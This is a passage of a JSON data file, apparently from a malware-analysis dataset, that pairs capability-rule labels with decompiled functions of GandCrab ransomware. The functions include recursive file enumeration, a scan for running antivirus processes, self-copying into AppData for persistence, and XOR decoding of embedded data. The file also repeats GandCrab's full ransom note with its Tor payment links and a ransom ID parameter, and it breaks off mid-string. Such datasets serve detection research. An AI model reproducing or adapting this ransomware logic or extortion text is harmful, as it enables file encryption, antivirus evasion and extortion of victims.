        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004066f0(uint arg_8h, int32_t *arg_ch, uint32_t *arg_10h)\n\n{\n    ushort *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    uint noname_0;\n    code *pcVar5;\n    bool bVar6;\n    ulong uVar7;\n    uint lpFindFileData;\n    uint lpString1;\n    uint var_14h;\n    ushort *var_10h;\n    uint32_t var_ch;\n    int32_t hFindFile;\n    \n    iVar4 = fcn.00406110();\n    if ((iVar4 != 0) && (iVar4 = fcn.004064a0(),  iVar4 == 0)) {\n        fcn.00406640();\n        iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n        pcVar5 = _sym.imp.KERNEL32.dll_lstrcatW;\n        puVar1 = in_ECX + iVar4 * 2;\n        var_10h = puVar1;\n        (*_sym.imp.KERNEL32.dll_lstrcatW)();\n        hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)();\n        *puVar1 = 0;\n        if (hFindFile == -1) {\n            return 0xdeadbeaf;\n        }\n        do {\n            iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&lpString1, 0x410368);\n            if ((iVar4 != 0) && (iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&lpString1, 0x41036c),  iVar4 != 0)) {\n                (*pcVar5)();\n                if ((lpFindFileData & 0x10) == 0) {\n                    var_ch = *arg_10h;\n                    uVar2 = arg_10h[1];\n                    uVar7 = fcn.004063b0(noname_0, arg_8h);\n                    uVar3 = *arg_10h;\n                    *arg_10h = *arg_10h + uVar7;\n                    arg_10h[1] = arg_10h[1] + (uVar7 >> 0x20) + CARRY4(uVar3, uVar7);\n                    bVar6 = uVar2 < arg_10h[1];\n                    pcVar5 = _sym.imp.KERNEL32.dll_lstrcatW;\n                    if ((bVar6 || uVar2 == arg_10h[1]) && ((bVar6 || (var_ch < *arg_10h)))) {\n                        *arg_ch = *arg_ch + 1;\n                        pcVar5 = _sym.imp.KERNEL32.dll_lstrcatW;\n                    }\n                }\n                else {\n                    (*pcVar5)();\n                    fcn.004066f0(arg_8h, arg_ch, arg_10h);\n                }\n                *var_10h = 0;\n            }\n            iVar4 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, &lpFindFileData);\n        } while (iVar4 != 0);\n        (*_sym.imp.KERNEL32.dll_FindClose)(hFindFile);\n    }\n    return 0;\n}\n",
        "token_count": 739
    },
    "00407520": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00407520(int16_t **arg_8h, uint32_t *arg_ch)\n\n{\n    code *pcVar1;\n    int16_t **ppiVar2;\n    int16_t *piVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    char16_t *var_4ch;\n    char16_t *var_48h;\n    char16_t *var_44h;\n    char16_t *var_40h;\n    char16_t *var_3ch;\n    char16_t *var_38h;\n    char16_t *var_34h;\n    char16_t *var_30h;\n    char16_t *var_2ch;\n    char16_t *var_28h;\n    char16_t *var_24h;\n    char16_t *var_20h;\n    char16_t *var_1ch;\n    char16_t *var_18h;\n    uint *var_14h;\n    int32_t hObject;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    ppiVar2 = arg_8h;\n    pcVar1 = _sym.imp.KERNEL32.dll_VirtualAlloc;\n    piVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x400, 0x3000, 4);\n    *arg_8h = piVar3;\n    var_4ch = L\"AVP.EXE\";\n    var_48h = L\"ekrn.exe\";\n    var_44h = L\"avgnt.exe\";\n    var_40h = L\"ashDisp.exe\";\n    var_3ch = L\"NortonAntiBot.exe\";\n    var_38h = L\"Mcshield.exe\";\n    var_34h = L\"avengine.exe\";\n    var_30h = L\"cmdagent.exe\";\n    var_2ch = L\"smc.exe\";\n    var_28h = L\"persfw.exe\";\n    var_24h = L\"pccpfw.exe\";\n    var_20h = L\"fsguiexe.exe\";\n    var_1ch = L\"cfp.exe\";\n    var_18h = L\"msmpeng.exe\";\n    puVar4 = (*pcVar1)(0, 4, 0x3000, 4);\n    if (puVar4 != NULL) {\n        *puVar4 = 0x22c;\n        var_14h = puVar4;\n        hObject = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2, 0);\n        if (hObject != -1) {\n            uVar6 = 0;\n            var_8h = 0;\n            arg_8h = NULL;\n            var_ch = 0;\n            var_4h = 0;\n            iVar5 = (*_sym.imp.KERNEL32.dll_Process32FirstW)(hObject, puVar4);\n            if (iVar5 != 0) {\n                while (uVar6 == 0) {\n                    puVar4 = puVar4 + 9;\n                    do {\n                        iVar5 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)((&var_4ch)[uVar6], puVar4);\n                        pcVar1 = _sym.imp.KERNEL32.dll_lstrcatW;\n                        if (iVar5 == 0) {\n                            var_ch = 1;\n                            if (arg_8h == NULL) {\n                                (*_sym.imp.KERNEL32.dll_lstrcpyW)();\n                                (*_sym.imp.KERNEL32.dll_lstrcatW)(*ppiVar2, 0x4107d0);\n                            }\n                            else {\n                                (*_sym.imp.KERNEL32.dll_lstrcatW)(*ppiVar2, puVar4);\n                                (*pcVar1)(*ppiVar2, 0x4107d0);\n                            }\n                            arg_8h = arg_8h + 1;\n                            iVar5 = (*_sym.imp.KERNEL32.dll_lstrlenW)(puVar4);\n                            var_8h = var_8h + iVar5 * 2;\n                            if (0x3c0 < var_8h) {\n                                var_4h = 1;\n                            }\n                            break;\n                        }\n                        uVar6 = uVar6 + 1;\n                    } while (uVar6 < 0xe);\n                    uVar6 = var_4h;\n                    puVar4 = var_14h;\n                    iVar5 = (*_sym.imp.KERNEL32.dll_Process32NextW)(hObject, var_14h);\n                    if ((iVar5 == 0) || (iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar5 == 0x12)) break;\n                }\n                if ((var_ch != 0) && (**ppiVar2 != 0)) {\n                    iVar5 = (*_sym.imp.KERNEL32.dll_lstrlenW)(*ppiVar2);\n                    (*ppiVar2)[iVar5 + -1] = 0;\n                }\n                *arg_ch = var_8h;\n            }\n            pcVar1 = _sym.imp.KERNEL32.dll_VirtualFree;\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar4, 0, 0x8000);\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n            iVar5 = var_ch;\n            if (var_ch == 0) {\n                (*pcVar1)(*ppiVar2, 0, 0x8000);\n            }\n            return iVar5;\n        }\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar4, 0, 0x8000);\n    }\n    return 0;\n}\n",
        "token_count": 1247
    },
    "00402ad0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00402ad0(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint extraout_ECX;\n    int32_t iVar6;\n    int32_t iStack84;\n    int32_t iStack80;\n    uint uStack76;\n    int32_t iStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    \n    uStack52 = 0x40;\n    uStack56 = 0x3000;\n    uStack60 = 0x800;\n    uStack64 = 0;\n    uStack68 = 0x402af0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)();\n    uStack52 = 0;\n    if (iVar2 == 0) {\n        iVar5 = 0;\n        iVar4 = 0;\n    }\n    else {\n        iVar4 = iVar2 + 0x202;\n        uStack52 = 0x404;\n        iVar5 = iVar2;\n        iVar2 = iVar2 + 0x404;\n    }\n    uStack68 = 0x100;\n    uStack76 = 0;\n    iStack80 = 0x402b32;\n    iStack72 = iVar5;\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)();\n    iStack84 = 0x100;\n    iStack80 = iVar4;\n    (*_sym.imp.KERNEL32.dll_GetTempPathW)();\n    iVar3 = fcn.00407ba0();\n    if (iVar3 == 0) {\n        uStack60 = 0x520050;\n        uStack56 = 0x440049;\n        uStack52 = 0x520055;\n        (*_sym.imp.KERNEL32.dll_lstrlenW)(&stack0xffffffc4, 0x52);\n        fcn.00407c60();\n        iVar6 = 0x100;\n        (*_sym.imp.KERNEL32.dll_GetEnvironmentVariableW)(L\"AppData\", iVar4);\n        iVar3 = fcn.00407ba0();\n        pcVar1 = _sym.imp.KERNEL32.dll_lstrcatW;\n        if (iVar3 == 0) {\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(iVar4, L\"\\\\Microsoft\\\\\");\n            (*pcVar1)(iVar4, &stack0xffffffac);\n            (*pcVar1)(iVar4, L\".exe\");\n            iVar5 = fcn.00402890(extraout_ECX);\n            if (iVar5 == 0) goto code_r0x00402c45;\n            iVar6 = 0x402c11;\n            iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar4);\n            iVar5 = iVar4;\n            if ((iStack84 == 0) || (0x7ff < iVar6 + iVar3 * 2 + 10)) {\n                iVar2 = 0;\n            }\n        }\n        else {\n            iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar5);\n            if ((iStack84 == 0) || (0x7ff < iVar6 + iVar4 * 2 + 10)) {\n                iVar2 = 0;\n            }\n        }\n        (*_sym.imp.USER32.dll_wsprintfW)(iVar2, L\"\\\"%s\\\"\", iVar5);\n    }\n    fcn.00402960();\ncode_r0x00402c45:\n    (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 816
    },
    "00403190": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.00403190(char *lpString1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    uchar uVar4;\n    \n    cVar1 = *lpString1;\n    pcVar3 = lpString1;\n    do {\n        if (cVar1 == '\\0') {\ncode_r0x004031b0:\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(lpString1, \"mask\");\n            uVar4 = iVar2 == 0;\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(lpString1, 0x40e2c0);\n            *pcVar3 = '=';\n            if (iVar2 == 0) {\n                uVar4 = 2;\n            }\n            return uVar4;\n        }\n        if (*pcVar3 == '}') {\n            return 0;\n        }\n        if (*pcVar3 == '=') {\n            *pcVar3 = '\\0';\n            goto code_r0x004031b0;\n        }\n        pcVar3 = pcVar3 + 1;\n        cVar1 = *pcVar3;\n    } while( true );\n}\n",
        "token_count": 265
    },
    "00403200": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403200(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    cVar1 = *arg_8h;\n    while (cVar1 != '\\0') {\n        if (cVar1 == '}') {\n            return 0;\n        }\n        arg_8h = arg_8h + 1;\n        if (cVar1 == '=') break;\n        cVar1 = *arg_8h;\n    }\n    cVar1 = *arg_8h;\n    pcVar2 = arg_8h;\n    if (cVar1 == '}') {\n        return 0;\n    }\n    while (cVar1 != '\\0') {\n        if (*pcVar2 == '}') {\n            *pcVar2 = '\\0';\n            break;\n        }\n        cVar1 = pcVar2[1];\n        pcVar2 = pcVar2 + 1;\n    }\n    if (arg_ch == 1) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(arg_8h);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, iVar3 + 1);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        *(in_ECX + 4) = iVar3;\n    }\n    else {\n        if (arg_ch != 2) goto code_r0x00403299;\n        iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(arg_8h);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, iVar3 + 1);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        *(in_ECX + 8) = iVar3;\n    }\n    if (iVar3 != 0) {\n        (*_sym.imp.KERNEL32.dll_lstrcpyA)(iVar3, arg_8h);\n    }\ncode_r0x00403299:\n    *pcVar2 = '}';\n    return 1;\n}\n",
        "token_count": 481
    },
    "00403320": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00403320(int32_t param_1)\n\n{\n    char cVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    char *pcVar5;\n    \n    pcVar5 = *(param_1 + 0xc);\n    if (*pcVar5 == '}') {\n        cVar1 = pcVar5[1];\n        if (cVar1 != '\\0') {\n            pcVar3 = pcVar5 + -0x40e2c7;\n            pcVar4 = pcVar5;\n            do {\n                pcVar5 = pcVar4 + 1;\n                pcVar2 = 0x40e2c8;\n                if (cVar1 != '\\0') {\n                    do {\n                        if (*pcVar2 == '\\0') goto code_r0x004033c7;\n                    } while ((pcVar3[pcVar2] == *pcVar2) && (pcVar2 = pcVar2 + 1,  pcVar3[pcVar2] != '\\0'));\n                    if (*pcVar2 == '\\0') goto code_r0x004033c7;\n                }\n                cVar1 = pcVar4[2];\n                pcVar3 = pcVar3 + 1;\n                pcVar4 = pcVar5;\n                if (cVar1 == '\\0') {\n                    return false;\n                }\n            } while( true );\n        }\n    }\n    else {\n        cVar1 = *pcVar5;\n        if (cVar1 != '\\0') {\n            pcVar4 = pcVar5 + -0x40e2d0;\n            do {\n                pcVar3 = \"{DELETE}\";\n                if (cVar1 != '\\0') {\n                    do {\n                        if (*pcVar3 == '\\0') goto code_r0x004033c7;\n                    } while ((pcVar4[pcVar3] == *pcVar3) && (pcVar3 = pcVar3 + 1,  pcVar4[pcVar3] != '\\0'));\n                    if (*pcVar3 == '\\0') goto code_r0x004033c7;\n                }\n                cVar1 = pcVar5[1];\n                pcVar5 = pcVar5 + 1;\n                pcVar4 = pcVar4 + 1;\n            } while (cVar1 != '\\0');\n        }\n    }\n    pcVar5 = NULL;\ncode_r0x004033c7:\n    return pcVar5 != NULL;\n}\n",
        "token_count": 542
    },
    "00403ff0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00403ff0(void)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint8_t *puVar10;\n    int32_t iVar11;\n    \n    if ((*0x412b00 == 0) &&\n       (*0x412b00 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x16c4, 0x3000, 4),  uVar8 = *0x41094c,  uVar7 = *0x410948\n       ,  uVar6 = *0x410944,  uVar5 = *0x410940,  *0x412b00 != 0)) {\n        uVar9 = 0;\n        if ((0x40ff21 < *0x412b00) || (*0x412b00 + 0x16c1 < 0x40e860)) {\n            do {\n                uVar2 = *(uVar9 + 0x40e864);\n                uVar3 = *(uVar9 + 0x40e868);\n                uVar4 = *(uVar9 + 0x40e86c);\n                puVar1 = *0x412b00 + uVar9;\n                *puVar1 = *(uVar9 + 0x40e860) ^ uVar5;\n                puVar1[1] = uVar2 ^ uVar6;\n                puVar1[2] = uVar3 ^ uVar7;\n                puVar1[3] = uVar4 ^ uVar8;\n                uVar9 = uVar9 + 0x10;\n            } while (uVar9 < 0x16c0);\n            if (0x16c1 < uVar9) {\n                return;\n            }\n        }\n        iVar11 = 0x16c2 - uVar9;\n        puVar10 = uVar9 + *0x412b00;\n        do {\n            *puVar10 = puVar10[0x40e860 - *0x412b00] ^ 5;\n            iVar11 = iVar11 + -1;\n            puVar10 = puVar10 + 1;\n        } while (iVar11 != 0);\n    }\n    return;\n}\n",
        "token_count": 550
    },
    "004040a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004040a0(uint param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    char16_t *pcVar8;\n    char16_t *pcVar9;\n    char16_t cVar10;\n    uint32_t *puVar11;\n    int32_t iVar12;\n    uint uStack344;\n    uint uStack340;\n    uint in_stack_fffffebc;\n    uint in_stack_fffffec0;\n    uint in_stack_fffffec4;\n    uint in_stack_fffffeec;\n    uint in_stack_fffffef0;\n    uint in_stack_fffffef4;\n    \n    if (*0x412b04 == NULL) {\n        uStack340 = 0x4040e6;\n        fcn.004039b0(0, param_1, 0, in_stack_fffffebc, in_stack_fffffec0, in_stack_fffffec4, 0, param_1, 0, param_1, 0, \n                     param_1, 0, param_1, 0, in_stack_fffffeec, in_stack_fffffef0, in_stack_fffffef4, 0, param_1, 0);\n        uStack340 = 0x4040ef;\n        fcn.00406d90();\n        uStack340 = 0x4040f8;\n        iVar5 = fcn.00406ba0();\n        uStack340 = 0x40;\n        uStack344 = 0x3000;\n        uVar1 = iVar5 * 2 + 0x42;\n        iVar6 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, uVar1);\n        if ((iVar6 == 0) || (uVar1 <= iVar5 * 2 + 0x40U)) {\n            iVar6 = 0;\n        }\n        fcn.004069a0(iVar6);\n        iVar5 = fcn.00407ba0();\n        iVar6 = (*_sym.imp.KERNEL32.dll_lstrlenW)(L\"ransom_id=\");\n        uVar4 = *0x41094c;\n        uVar3 = *0x410948;\n        uVar2 = *0x410944;\n        uVar1 = *0x410940;\n        iVar12 = 0xad;\n        iVar5 = iVar5 + iVar6 * 2;\n        uVar7 = 0xad0;\n        puVar11 = \n        str.____GANDCRAB_____r_n_r_nAttention__r_nAll_your_files_documents__photos__databases_and_other_important_files_are_encrypted_and_have_the_extension:_.GDCB__r_nThe_only_method_of_recovering_files_is_to_purchase_a_private_key._It_is_on_our_server_and_only_we_can_recover_your_files._r_nThe_server_with_your_key_is_in_a_closed_network_TOR._You_can_get_there_by_the_following_ways:_r_n1._Download_Tor_browser___https:__www.torproject.org__r_n2._Install_Tor_browser_r_n3._Open_Tor_Browser_r_n4._Open_link_in_tor_browser:_http:__gdcbghvjyqy7jclk.onion_8e1511be8e330798___________________________r_n5._Follow_the_instructions_on_this_page_r_n_r_n_r_nIf_Tor_Tor_browser_is_locked_in_your_country_or_you_can_not_install_it__open_one_of_the_following_links_in_your_regular_browser:_r_n1._http:__gdcbghvjyqy7jclk.onion.top_8e1511be8e330798___________________r_n2._http:__gdcbghvjyqy7jclk.onion.casa_8e1511be8e330798__________________r_n3._http:__gdcbghvjyqy7jclk.onion.guide_8e1511be8e330798____________________r_n4._http:__gdcbghvjyqy7jclk.onion.rip_8e1511be8e330798__________________________________________________r_n5._http:__gdcbghvjyqy7jclk.onion.plus_8e1511be8e330798________________________________r_n_r_nOn_our_page_you_will_see_instructions_on_payment_and_get_the_opportunity_to_decrypt_1_file_for_free._r_n_r_nDANGEROUS__r_nDo_not_try_to_modify_files_or_use_your_own_private_key___this_will_result_in_the_loss_of_your_data_forever__r_n\n        ;\n        do {\n            *puVar11 = *puVar11 ^ uVar1;\n            puVar11[1] = puVar11[1] ^ uVar2;\n            puVar11[2] = puVar11[2] ^ uVar3;\n            puVar11[3] = puVar11[3] ^ uVar4;\n            iVar12 = iVar12 + -1;\n            puVar11 = puVar11 + 4;\n        } while (iVar12 != 0);\n        do {\n            *(\n             str.____GANDCRAB_____r_n_r_nAttention__r_nAll_your_files_documents__photos__databases_and_other_important_files_are_encrypted_and_have_the_extension:_.GDCB__r_nThe_only_method_of_recovering_files_is_to_purchase_a_private_key._It_is_on_our_server_and_only_we_can_recover_your_files._r_nThe_server_with_your_key_is_in_a_closed_network_TOR._You_can_get_there_by_the_following_ways:_r_n1._Download_Tor_browser___https:__www.torproject.org__r_n2._Install_Tor_browser_r_n3._Open_Tor_Browser_r_n4._Open_link_in_tor_browser:_http:__gdcbghvjyqy7jclk.onion_8e1511be8e330798___________________________r_n5._Follow_the_instructions_on_this_page_r_n_r_n_r_nIf_Tor_Tor_browser_is_locked_in_your_country_or_you_can_not_install_it__open_one_of_the_following_links_in_your_regular_browser:_r_n1._http:__gdcbghvjyqy7jclk.onion.top_8e1511be8e330798___________________r_n2._http:__gdcbghvjyqy7jclk.onion.casa_8e1511be8e330798__________________r_n3._http:__gdcbghvjyqy7jclk.onion.guide_8e1511be8e330798____________________r_n4._http:__gdcbghvjyqy7jclk.onion.rip_8e1511be8e330798__________________________________________________r_n5._http:__gdcbghvjyqy7jclk.onion.plus_8e1511be8e330798________________________________r_n_r_nOn_our_page_you_will_see_instructions_on_payment_and_get_the_opportunity_to_decrypt_1_file_for_free._r_n_r_nDANGEROUS__r_nDo_not_try_to_modify_files_or_use_your_own_private_key___this_will_result_in_the_loss_of_your_data_forever__r_n\n             + uVar7) = *(\n                         str.____GANDCRAB_____r_n_r_nAttention__r_nAll_your_files_documents__photos__databases_and_other_important_files_are_encrypted_and_have_the_extension:_.GDCB__r_nThe_only_method_of_recovering_files_is_to_purchase_a_private_key._It_is_on_our_server_and_only_we_can_recover_your_files._r_nThe_server_with_your_key_is_in_a_closed_network_TOR._You_can_get_there_by_the_following_ways:_r_n1._Download_Tor_browser___https:__www.torproject.org__r_n2._Install_Tor_browser_r_n3._Open_Tor_Browser_r_n4._Open_link_in_tor_browser:_http:__gdcbghvjyqy7jclk.onion_8e1511be8e330798___________________________r_n5._Follow_the_instructions_on_this_page_r_n_r_n_r_nIf_Tor_Tor_browser_is_locked_in_your_country_or_you_can_not_install_it__open_one_of_the_following_links_in_your_regular_browser:_r_n1._http:__gdcbghvjyqy7jclk.onion.top_8e1511be8e330798___________________r_n2._http:__gdcbghvjyqy7jclk.onion.casa_8e1511be8e330798__________________r_n3._http:__gdcbghvjyqy7jclk.onion.guide_8e1511be8e330798____________________r_n4._http:__gdcbghvjyqy7jclk.onion.rip_8e1511be8e330798__________________________________________________r_n5._http:__gdcbghvjyqy7jclk.onion.plus_8e1511be8e330798________________________________r_n_r_nOn_our_page_you_will_see_instructions_on_payment_and_get_the_opportunity_to_decrypt_1_file_for_free._r_n_r_nDANGEROUS__r_nDo_not_try_to_modify_files_or_use_your_own_private_key___this_will_result_in_the_loss_of_your_data_forever__r_n\n                         + uVar7) ^ 5;\n            uVar7 = uVar7 + 1;\n        } while (uVar7 < 0xad6);\n        *0x412b04 = \n        str.____GANDCRAB_____r_n_r_nAttention__r_nAll_your_files_documents__photos__databases_and_other_important_files_are_encrypted_and_have_the_extension:_.GDCB__r_nThe_only_method_of_recovering_files_is_to_purchase_a_private_key._It_is_on_our_server_and_only_we_can_recover_your_files._r_nThe_server_with_your_key_is_in_a_closed_network_TOR._You_can_get_there_by_the_following_ways:_r_n1._Download_Tor_browser___https:__www.torproject.org__r_n2._Install_Tor_browser_r_n3._Open_Tor_Browser_r_n4._Open_link_in_tor_browser:_http:__gdcbghvjyqy7jclk.onion_8e1511be8e330798___________________________r_n5._Follow_the_instructions_on_this_page_r_n_r_n_r_nIf_Tor_Tor_browser_is_locked_in_your_country_or_you_can_not_install_it__open_one_of_the_following_links_in_your_regular_browser:_r_n1._http:__gdcbghvjyqy7jclk.onion.top_8e1511be8e330798___________________r_n2._http:__gdcbghvjyqy7jclk.onion.casa_8e1511be8e330798__________________r_n3._http:__gdcbghvjyqy7jclk.onion.guide_8e1511be8e330798____________________r_n4._http:__gdcbghvjyqy7jclk.onion.rip_8e1511be8e330798__________________________________________________r_n5._http:__gdcbghvjyqy7jclk.onion.plus_8e1511be8e330798________________________________r_n_r_nOn_our_page_you_will_see_instructions_on_payment_and_get_the_opportunity_to_decrypt_1_file_for_free._r_n_r_nDANGEROUS__r_nDo_not_try_to_modify_files_or_use_your_own_private_key___this_will_result_in_the_loss_of_your_data_forever__r_n\n        ;\n        iVar6 = iVar5;\n        pcVar8 = fcn.00407ba0();\n        if (pcVar8 != NULL) {\ncode_r0x004041c0:\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(pcVar8, iVar5);\n            iVar12 = (*_sym.imp.KERNEL32.dll_lstrlenW)(pcVar8);\n            pcVar8[iVar12] = L' ';\n            pcVar8 = \n            str.____GANDCRAB_____r_n_r_nAttention__r_nAll_your_files_documents__photos__databases_and_other_important_files_are_encrypted_and_have_the_extension:_.GDCB__r_nThe_only_method_of_recovering_files_is_to_purchase_a_private_key._It_is_on_our_server_and_only_we_can_recover_your_files._r_nThe_server_with_your_key_is_in_a_closed_network_TOR._You_can_get_there_by_the_following_ways:_r_n1._Download_Tor_browser___https:__www.torproject.org__r_n2._Install_Tor_browser_r_n3._Open_Tor_Browser_r_n4._Open_link_in_tor_browser:_http:__gdcbghvjyqy7jclk.onion_8e1511be8e330798___________________________r_n5._Follow_the_instructions_on_this_page_r_n_r_n_r_nIf_Tor_Tor_browser_is_locked_in_your_country_or_you_can_not_install_it__open_one_of_the_following_links_in_your_regular_browser:_r_n1._http:__gdcbghvjyqy7jclk.onion.top_8e1511be8e330798___________________r_n2._http:__gdcbghvjyqy7jclk.onion.casa_8e1511be8e330798__________________r_n3._http:__gdcbghvjyqy7jclk.onion.guide_8e1511be8e330798____________________r_n4._http:__gdcbghvjyqy7jclk.onion.rip_8e1511be8e330798__________________________________________________r_n5._http:__gdcbghvjyqy7jclk.onion.plus_8e1511be8e330798________________________________r_n_r_nOn_our_page_you_will_see_instructions_on_payment_and_get_the_opportunity_to_decrypt_1_file_for_free._r_n_r_nDANGEROUS__r_nDo_not_try_to_modify_files_or_use_your_own_private_key___this_will_result_in_the_loss_of_your_data_forever__r_n\n            ;\n            if (str.____GANDCRAB_____r_n_r_nAttention__r_nAll_your_files_documents__photos__databases_and_other_important_files_are_encrypted_and_have_the_extension:_.GDCB__r_nThe_only_method_of_recovering_files_is_to_purchase_a_private_key._It_is_on_our_server_and_only_we_can_recover_your_files._r_nThe_server_with_your_key_is_in_a_closed_network_TOR._You_can_get_there_by_the_following_ways:_r_n1._Download_Tor_browser___https:__www.torproject.org__r_n2._Install_Tor_browser_r_n3._Open_Tor_Browser_r_n4._Open_link_in_tor_browser:_http:__gdcbghvjyqy7jclk.onion_8e1511be8e330798___________________________r_n5._Follow_the_instructions_on_this_page_r_n_r_n_r_nIf_Tor_Tor_browser_is_locked_in_your_country_or_you_can_not_install_it__open_one_of_the_following_links_in_your_regular_browser:_r_n1._http:__gdcbghvjyqy7jclk.onion.top_8e1511be8e330798___________________r_n2._http:__gdcbghvjyqy7jclk.onion.casa_8e1511be8e330798__________________r_n3._http:__gdcbghvjyqy7jclk.onion.guide_8e1511be8e330798____________________r_n4._http:__gdcbghvjyqy7jclk.onion.rip_8e1511be8e330798__________________________________________________r_n5._http:__gdcbghvjyqy7jclk.onion.plus_8e1511be8e330798________________________________r_n_r_nOn_our_page_you_will_see_instructions_on_payment_and_get_the_opportunity_to_decrypt_1_file_for_free._r_n_r_nDANGEROUS__r_nDo_not_try_to_modify_files_or_use_your_own_private_key___this_will_result_in_the_loss_of_your_data_forever__r_n\n                [0] != L'\\0') {\n                iVar12 = 0x3c38;\n                cVar10 = str.____GANDCRAB_____r_n_r_nAttention__r_nAll_your_files_documents__photos__databases_and_other_important_files_are_encrypted_and_have_the_extension:_.GDCB__r_nThe_only_method_of_recovering_files_is_to_purchase_a_private_key._It_is_on_our_server_and_only_we_can_recover_your_files._r_nThe_server_with_your_key_is_in_a_closed_network_TOR._You_can_get_there_by_the_following_ways:_r_n1._Download_Tor_browser___https:__www.torproject.org__r_n2._Install_Tor_browser_r_n3._Open_Tor_Browser_r_n4._Open_link_in_tor_browser:_http:__gdcbghvjyqy7jclk.onion_8e1511be8e330798___________________________r_n5._Follow_the_instructions_on_this_page_r_n_r_n_r_nIf_Tor_Tor_browser_is_locked_in_your_country_or_you_can_not_install_it__open_one_of_the_following_links_in_your_regular_browser:_r_n1._http:__gdcbghvjyqy7jclk.onion.top_8e1511be8e330798___________________r_n2._http:__gdcbghvjyqy7jclk.onion.casa_8e1511be8e330798__________________r_n3._http:__gdcbghvjyqy7jclk.onion.guide_8e1511be8e330798____________________r_n4._http:__gdcbghvjyqy7jclk.onion.rip_8e1511be8e330798_______________